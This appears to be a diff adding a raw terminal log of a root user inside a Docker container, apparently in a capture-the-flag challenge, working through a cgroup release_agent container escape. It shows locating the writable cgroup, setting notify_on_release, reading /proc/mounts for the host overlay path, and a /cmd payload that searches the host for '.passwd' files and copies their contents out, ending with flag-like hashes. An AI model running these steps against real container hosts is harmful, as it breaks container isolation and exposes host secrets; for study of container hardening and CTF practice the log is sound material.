@@ -1,0 +1,258 @@
+
+root@y0uc4nt3sc4p3:~# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
+root@y0uc4nt3sc4p3:~# echo $d
+/sys/fs/cgroup/rdma
+root@y0uc4nt3sc4p3:~# mkdir -p $d/w; echo 1 > $d/w/notify_on_release
+mkdir: cannot create directory ‘/sys/fs/cgroup/rdma/w’: Read-only file system
+-bash: /sys/fs/cgroup/rdma/w/notify_on_release: No such file or directory
+root@y0uc4nt3sc4p3:~# cd /sys/fs/cgroup/rdma/
+root@y0uc4nt3sc4p3:/sys/fs/cgroup/rdma# ls
+cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks
+root@y0uc4nt3sc4p3:/sys/fs/cgroup/rdma# cd ..
+root@y0uc4nt3sc4p3:/sys/fs/cgroup# ls -al
+total 0
+       
+root@y0uc4nt3sc4p3:/sys/fs/cgroup# cd
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# which bash
+/usr/bin/bash
+root@y0uc4nt3sc4p3:~# chmod +x script.sh 
+root@y0uc4nt3sc4p3:~# ./script.sh 
+root@y0uc4nt3sc4p3:~# ls
+script.sh
+root@y0uc4nt3sc4p3:~# cd /output 
+-bash: cd: /output: Not a directory
+root@y0uc4nt3sc4p3:~# ls
+script.sh
+root@y0uc4nt3sc4p3:~# cat /output
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.6  0.3 103196 12872 ?        Ss   15:12   0:08 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    15:12   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I<   15:12   0:00 [rcu_gp]
+root           4  0.0  0.0      0     0 ?        I<   15:12   0:00 [rcu_par_gp]
+root           5  0.0  0.0      0     0 ?        I    15:12   0:00 [kworker/0:0-events]
+root           6  0.0  0.0      0     0 ?        I<   15:12   0:00 [kworker/0:0H-kblockd]
+root           8  0.0  0.0      0     0 ?        I<   15:12   0:00 [mm_percpu_wq]
+root           9  0.0  0.0      0     0 ?        S    15:12   0:00 [ksoftirqd/0]
+root          10  0.0  0.0      0     0 ?        I    15:12   0:00 [rcu_sched]
+root          11  0.0  0.0      0     0 ?        S    15:12   0:00 [migration/0]
+root          12  0.0  0.0      0     0 ?        S    15:12   0:00 [idle_inject/0]
+root          14  0.0  0.0      0     0 ?        S    15:12   0:00 [cpuhp/0]
+.
+.
+.
+.
+
+
+
+root@y0uc4nt3sc4p3:~# ./script.sh ; cat /output
+./script.sh: line 7: syntax error near unexpected token `fi'
+./script.sh: line 7: `fi'
+ac5325b11272e74179c7a96aef3a762b
+
+
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# ./script.sh ; cat /output
+mkdir: cannot create directory ‘/tmp/cgrp’: File exists
+ac5325b11272e74179c7a96aef3a762b
+root@y0uc4nt3sc4p3:~# 
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# ./script.sh ; cat /output
+mkdir: cannot create directory ‘/tmp/cgrp’: File exists
+ac5325b11272e74179c7a96aef3a762b
+ac5325b11272e74179c7a96aef3a762b
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# ./script.sh ; cat /output
+mkdir: cannot create directory ‘/tmp/cgrp’: File exists
+cat: /output: No such file or directory
+cat: /output: No such file or directory
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# ./script.sh 
+mkdir: cannot create directory ‘/tmp/cgrp’: File exists
+root@y0uc4nt3sc4p3:~# 
+root@y0uc4nt3sc4p3:~# 
+root@y0uc4nt3sc4p3:~# 
+root@y0uc4nt3sc4p3:~# 
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# umount /tmp/cgrp/
+cgroup.clone_children  cgroup.sane_behavior   release_agent          x/                     
+cgroup.procs           notify_on_release      tasks                  
+root@y0uc4nt3sc4p3:~# umount /tmp/cgrp/
+root@y0uc4nt3sc4p3:~# rm -rf /tmp/cgrp/
+root@y0uc4nt3sc4p3:~# cat /proc/mounts 
+overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/DUGAWXBT6KRCII2S7S4IEGFYSE:/var/lib/docker/overlay2/l/GLLVMCOEG7NMBWQUTJQHIRRBWL:/var/lib/docker/overlay2/l/WWV6W5ITMUVE5Q2XMBP3ASRD6X:/var/lib/docker/overlay2/l/DOOS3GBAYP7Q2K64NZLOYEOH3F:/var/lib/docker/overlay2/l/GEZJXZBY2RD5TCODV2OFARWQ62:/var/lib/docker/overlay2/l/3JMQTBM6EBG2MU54LPQSSI7RZM:/var/lib/docker/overlay2/l/ZHV4SLYY3GF4A2I5QMNHTDNUDN:/var/lib/docker/overlay2/l/RHQAG73ULD6A5K4ZJDR5H2TZ7X,upperdir=/var/lib/docker/overlay2/552ea8210fd6381d7b4a3066222fbe6295509a3baa1820bbac70b8df968a7d2c/diff,workdir=/var/lib/docker/overlay2/552ea8210fd6381d7b4a3066222fbe6295509a3baa1820bbac70b8df968a7d2c/work,xino=off 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
+devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
+sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
+tmpfs /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode=755 0 0
+cgroup /sys/fs/cgroup/systemd cgroup ro,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0
+cgroup /sys/fs/cgroup/memory cgroup ro,nosuid,nodev,noexec,relatime,memory 0 0
+cgroup /sys/fs/cgroup/hugetlb cgroup ro,nosuid,nodev,noexec,relatime,hugetlb 0 0
+cgroup /sys/fs/cgroup/devices cgroup ro,nosuid,nodev,noexec,relatime,devices 0 0
+cgroup /sys/fs/cgroup/cpu,cpuacct cgroup ro,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
+cgroup /sys/fs/cgroup/net_cls,net_prio cgroup ro,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
+cgroup /sys/fs/cgroup/cpuset cgroup ro,nosuid,nodev,noexec,relatime,cpuset 0 0
+cgroup /sys/fs/cgroup/rdma cgroup ro,nosuid,nodev,noexec,relatime,rdma,release_agent=/var/lib/docker/overlay2/552ea8210fd6381d7b4a3066222fbe6295509a3baa1820bbac70b8df968a7d2c/diff/cmd 0 0
+cgroup /sys/fs/cgroup/perf_event cgroup ro,nosuid,nodev,noexec,relatime,perf_event 0 0
+cgroup /sys/fs/cgroup/blkio cgroup ro,nosuid,nodev,noexec,relatime,blkio 0 0
+cgroup /sys/fs/cgroup/freezer cgroup ro,nosuid,nodev,noexec,relatime,freezer 0 0
+cgroup /sys/fs/cgroup/pids cgroup ro,nosuid,nodev,noexec,relatime,pids 0 0
+mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
+shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
+/dev/sda2 /etc/resolv.conf ext4 rw,relatime 0 0
+/dev/sda2 /etc/hostname ext4 rw,relatime 0 0
+/dev/sda2 /etc/hosts ext4 rw,relatime 0 0
+devpts /dev/console devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
+proc /proc/bus proc ro,nosuid,nodev,noexec,relatime 0 0
+proc /proc/fs proc ro,nosuid,nodev,noexec,relatime 0 0
+proc /proc/irq proc ro,nosuid,nodev,noexec,relatime 0 0
+proc /proc/sys proc ro,nosuid,nodev,noexec,relatime 0 0
+proc /proc/sysrq-trigger proc ro,nosuid,nodev,noexec,relatime 0 0
+tmpfs /proc/acpi tmpfs ro,relatime 0 0
+tmpfs /proc/kcore tmpfs rw,nosuid,size=65536k,mode=755 0 0
+tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755 0 0
+tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755 0 0
+tmpfs /proc/sched_debug tmpfs rw,nosuid,size=65536k,mode=755 0 0
+tmpfs /proc/scsi tmpfs ro,relatime 0 0
+tmpfs /sys/firmware tmpfs ro,relatime 0 0
+root@y0uc4nt3sc4p3:~# ./script.sh 
+mkdir: cannot create directory ‘/tmp/cgrp/x’: File exists
+root@y0uc4nt3sc4p3:~# umount 
+.bashrc    .cache/    .local/    .profile   script.sh  
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# ./script.sh 
+mkdir: cannot create directory ‘/tmp/cgrp’: File exists
+cat: /output: No such file or directory
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# ./script.sh 
+mkdir: cannot create directory ‘/tmp/cgrp’: File exists
+cat: /output: No such file or directory
+root@y0uc4nt3sc4p3:~# ls /tmp/cgrp/
+cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# umount /tmp/cgrp
+root@y0uc4nt3sc4p3:~# rm -rf /tmp/cgrp
+root@y0uc4nt3sc4p3:~# ls /tmp/crgp
+ls: cannot access '/tmp/crgp': No such file or directory
+root@y0uc4nt3sc4p3:~# ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.0   2608   596 pts/0    Ss   15:13   0:00 /bin/sh -c /etc/init.d/ssh restart && bash
+root          22  0.0  0.0  12176  3032 ?        Ss   15:13   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
+root          24  0.0  0.0   4108  3268 pts/0    S+   15:13   0:00 bash
+root          27  0.0  0.2  13896  9208 ?        Rs   15:13   0:00 sshd: root@pts/1
+root          38  0.0  0.0   5992  3948 pts/1    Ss   15:13   0:00 -bash
+root         173  0.0  0.0   7648  3184 pts/1    R+   15:49   0:00 ps aux
+root@y0uc4nt3sc4p3:~# cat /output 
+cat: /output: No such file or directory
+root@y0uc4nt3sc4p3:~# ls /
+ls: cannot access '/output': No such file or directory
+bin   cmd  etc   lib    lib64   media  opt     proc  run   srv  tmp  var
+boot  dev  home  lib32  libx32  mnt    output  root  sbin  sys  usr
+root@y0uc4nt3sc4p3:~# file outpuit
+outpuit: cannot open `outpuit' (No such file or directory)
+root@y0uc4nt3sc4p3:~# file output
+output: cannot open `output' (No such file or directory)
+root@y0uc4nt3sc4p3:~# ls -al /
+ls: cannot access '/output': No such file or directory
+total 68
+drwxr-xr-x   1 root root 4096 Jun  8 15:41 .
+drwxr-xr-x   1 root root 4096 Jun  8 15:41 ..
+-rwxr-xr-x   1 root root    0 Jan 16 10:59 .dockerenv
+lrwxrwxrwx   1 root root    7 Jan  5 16:47 bin -> usr/bin
+drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
+-rwxr-xr-x   1 root root  151 Jun  8 15:48 cmd
+drwxr-xr-x   5 root root  360 Jun  8 15:13 dev
+drwxr-xr-x   1 root root 4096 Jan 16 10:59 etc
+drwxr-xr-x   2 root root 4096 Apr 15  2020 home
+lrwxrwxrwx   1 root root    7 Jan  5 16:47 lib -> usr/lib
+lrwxrwxrwx   1 root root    9 Jan  5 16:47 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root    9 Jan  5 16:47 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root   10 Jan  5 16:47 libx32 -> usr/libx32
+drwxr-xr-x   2 root root 4096 Jan  5 16:47 media
+drwxr-xr-x   2 root root 4096 Jan  5 16:47 mnt
+drwxr-xr-x   2 root root 4096 Jan  5 16:47 opt
+-?????????   ? ?    ?       ?            ? output
+dr-xr-xr-x 173 root root    0 Jun  8 15:13 proc
+drwx------   1 root root 4096 Jun  8 15:49 root
+drwxr-xr-x   1 root root 4096 Jun  8 15:13 run
+lrwxrwxrwx   1 root root    8 Jan  5 16:47 sbin -> usr/sbin
+drwxr-xr-x   2 root root 4096 Jan  5 16:47 srv
+dr-xr-xr-x  13 root root    0 Jun  8 15:12 sys
+drwxrwxrwt   1 root root 4096 Jun  8 15:49 tmp
+drwxr-xr-x   1 root root 4096 Jan  5 16:47 usr
+drwxr-xr-x   1 root root 4096 Jan  5 16:50 var
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# ./script.sh 
+mkdir: cannot create directory ‘/tmp/cgrp/x’: File exists
+/
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# man find
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, including manpages, you can run the 'unminimize'
+command. You will still need to ensure the 'man-db' package is installed.
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# ./script.sh 
+mkdir: cannot create directory ‘/tmp/cgrp’: File exists
+cat: /output3: No such file or directory
+root@y0uc4nt3sc4p3:~# ls -al
+total 28
+drwx------ 1 root root 4096 Jun  8 15:56 .
+drwxr-xr-x 1 root root 4096 Jun  8 15:56 ..
+-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
+drwx------ 2 root root 4096 Jan 16 10:59 .cache
+drwxr-xr-x 3 root root 4096 Jun  8 15:36 .local
+-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
+-rwxr-xr-x 1 root root 1408 Jun  8 15:56 script.sh
+root@y0uc4nt3sc4p3:~# ls -al /
+ls: cannot access '/output': No such file or directory
+ls: cannot access '/output3': No such file or directory
+total 72
+drwxr-xr-x   1 root root 4096 Jun  8 15:56 .
+drwxr-xr-x   1 root root 4096 Jun  8 15:56 ..
+-rwxr-xr-x   1 root root    0 Jan 16 10:59 .dockerenv
+lrwxrwxrwx   1 root root    7 Jan  5 16:47 bin -> usr/bin
+drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
+-rwxr-xr-x   1 root root  154 Jun  8 15:56 cmd
+drwxr-xr-x   5 root root  360 Jun  8 15:13 dev
+drwxr-xr-x   1 root root 4096 Jan 16 10:59 etc
+drwxr-xr-x   2 root root 4096 Apr 15  2020 home
+lrwxrwxrwx   1 root root    7 Jan  5 16:47 lib -> usr/lib
+lrwxrwxrwx   1 root root    9 Jan  5 16:47 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root    9 Jan  5 16:47 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root   10 Jan  5 16:47 libx32 -> usr/libx32
+drwxr-xr-x   2 root root 4096 Jan  5 16:47 media
+drwxr-xr-x   2 root root 4096 Jan  5 16:47 mnt
+drwxr-xr-x   2 root root 4096 Jan  5 16:47 opt
+-?????????   ? ?    ?       ?            ? output
+-rw-r--r--   1 root root    2 Jun  8 15:51 output2
+-?????????   ? ?    ?       ?            ? output3
+dr-xr-xr-x 174 root root    0 Jun  8 15:13 proc
+drwx------   1 root root 4096 Jun  8 15:56 root
+drwxr-xr-x   1 root root 4096 Jun  8 15:13 run
+lrwxrwxrwx   1 root root    8 Jan  5 16:47 sbin -> usr/sbin
+drwxr-xr-x   2 root root 4096 Jan  5 16:47 srv
+dr-xr-xr-x  13 root root    0 Jun  8 15:12 sys
+drwxrwxrwt   1 root root 4096 Jun  8 15:51 tmp
+drwxr-xr-x   1 root root 4096 Jan  5 16:47 usr
+drwxr-xr-x   1 root root 4096 Jan  5 16:50 var
+root@y0uc4nt3sc4p3:~# cat /output2
+/
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# cat /cmd 
+#!/bin/sh
+find / -name .passwd -exec cat '{}' \; > /var/lib/docker/overlay2/552ea8210fd6381d7b4a3066222fbe6295509a3baa1820bbac70b8df968a7d2c/diff/output3
+root@y0uc4nt3sc4p3:~# nano script.sh
+root@y0uc4nt3sc4p3:~# ./script.sh 
+mkdir: cannot create directory ‘/tmp/cgrp’: File exists
+
+
+
+root@y0uc4nt3sc4p3:~# cat /output4
+6a78b6412bce42ad35bf58f55362aa29
+root@y0uc4nt3sc4p3:~# client_loop: send disconnect: Broken pipe
+
